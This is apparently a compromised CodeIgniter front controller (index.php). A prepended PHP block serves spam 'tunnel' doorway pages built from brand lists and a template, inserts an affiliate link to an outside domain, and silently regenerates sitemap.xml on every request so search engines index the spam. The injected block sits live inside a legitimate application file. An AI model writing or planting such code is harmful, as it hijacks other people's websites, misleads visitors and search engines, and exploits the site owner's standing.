<?php
// Konfigurasi
$brand_list_file = 'uwaw.txt';
$template_file = 'sugoi.txt';
$base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$current_url = $base_url . $_SERVER['REQUEST_URI'];

// LINK TUJUAN (AFFILIATE LINK) - EDIT DISINI
$link_daftar = "https://mangeacuk.pages.dev/"; // Ganti dengan link affiliate Anda

// Fungsi untuk memuat daftar brand
function loadBrands($filename) {
    if (!file_exists($filename)) return [];
    $content = file_get_contents($filename);
    return array_filter(array_map('trim', explode("\n", $content)));
}

// Fungsi untuk generate dan menyimpan sitemap
function generateAndSaveSitemap($brands, $base_url) {
    $sitemap_content = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    $sitemap_content .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    
    // URL utama
    $sitemap_content .= "  <url>\n";
    $sitemap_content .= "    <loc>{$base_url}/</loc>\n";
    $sitemap_content .= "    <priority>1.0</priority>\n";
    $sitemap_content .= "    <changefreq>daily</changefreq>\n";
    $sitemap_content .= "  </url>\n";
    
    // URL untuk setiap brand
    foreach ($brands as $brand) {
        $brand_url = str_replace(' ', '-', strtolower($brand));
        $sitemap_content .= "  <url>\n";
        $sitemap_content .= "    <loc>{$base_url}/?tunnel={$brand_url}</loc>\n";
        $sitemap_content .= "    <priority>0.8</priority>\n";
        $sitemap_content .= "    <changefreq>weekly</changefreq>\n";
        $sitemap_content .= "  </url>\n";
    }
    
    $sitemap_content .= '</urlset>';
    
    // Simpan sitemap (tidak terlihat di browser tapi bisa diakses)
    file_put_contents('sitemap.xml', $sitemap_content);
    
    return $sitemap_content;
}

// Fungsi untuk memuat template
function loadTemplate($filename) {
    return file_exists($filename) ? file_get_contents($filename) : false;
}

// Main Logic
$brands = loadBrands($brand_list_file);
$template_content = loadTemplate($template_file);

// GENERATE SITEMAP OTOMATIS setiap kali script diakses
if (count($brands) > 0) {
    generateAndSaveSitemap($brands, $base_url);
}

// Handle direct sitemap request
if (parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) === '/sitemap.xml') {
    header('Content-Type: application/xml');
    
    // Jika sitemap sudah ada, tampilkan yang sudah ada
    if (file_exists('sitemap.xml')) {
        echo file_get_contents('sitemap.xml');
    } else {
        // Jika belum ada, generate baru
        echo generateAndSaveSitemap($brands, $base_url);
    }
    exit;
}

// Handle tunnel request
if (isset($_GET['tunnel']) && !empty($_GET['tunnel'])) {
    $requested_brand = str_replace('-', ' ', $_GET['tunnel']);
    
    // Cari brand yang sesuai
    $selected_brand = null;
    foreach ($brands as $brand) {
        if (strtolower($brand) === strtolower($requested_brand)) {
            $selected_brand = $brand;
            break;
        }
    }
    
    if ($selected_brand && $template_content) {
        // Ganti placeholder dengan nilai aktual
        $canonical_url = $base_url . '/?tunnel=' . str_replace(' ', '-', strtolower($selected_brand));
        $output = str_replace(
            ['{brand}', '{canonical}', '{link-daftar}'],
            [$selected_brand, $canonical_url, $link_daftar],
            $template_content
        );
        
        // Set header dan output konten
        header('Content-Type: text/html; charset=utf-8');
        echo $output;
        exit;
    }
}

// Jika tidak ada tunnel parameter atau brand tidak ditemukan, lanjut ke HTML normal
?>


<?php

// Check PHP version.
$minPhpVersion = '7.4'; // If you update this, don't forget to update `spark`.
if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
    $message = sprintf(
        'Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',
        $minPhpVersion,
        PHP_VERSION
    );

    exit($message);
}

// Path to the front controller (this file)
define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);

// Ensure the current directory is pointing to the front controller's directory
chdir(FCPATH);

/*
 *---------------------------------------------------------------
 * BOOTSTRAP THE APPLICATION
 *---------------------------------------------------------------
 * This process sets up the path constants, loads and registers
 * our autoloader, along with Composer's, loads our constants
 * and fires up an environment-specific bootstrapping.
 */

// Load our paths config file
// This is the line that might need to be changed, depending on your folder structure.
require FCPATH . '../library_upr/app/Config/Paths.php';
// ^^^ Change this line if you move your application folder

$paths = new Config\Paths();

// Location of the framework bootstrap file.
require rtrim($paths->systemDirectory, '\\/ ') . DIRECTORY_SEPARATOR . 'bootstrap.php';

// Load environment settings from .env files into $_SERVER and $_ENV
require_once SYSTEMPATH . 'Config/DotEnv.php';
(new CodeIgniter\Config\DotEnv(ROOTPATH))->load();

/*
 * ---------------------------------------------------------------
 * GRAB OUR CODEIGNITER INSTANCE
 * ---------------------------------------------------------------
 *
 * The CodeIgniter class contains the core functionality to make
 * the application run, and does all the dirty work to get
 * the pieces all working together.
 */

$app = Config\Services::codeigniter();
$app->initialize();
$context = is_cli() ? 'php-cli' : 'web';
$app->setContext($context);

/*
 *---------------------------------------------------------------
 * LAUNCH THE APPLICATION
 *---------------------------------------------------------------
 * Now that everything is set up, it's time to actually fire
 * up the engines and make this app do its thang.
 */

$app->run();
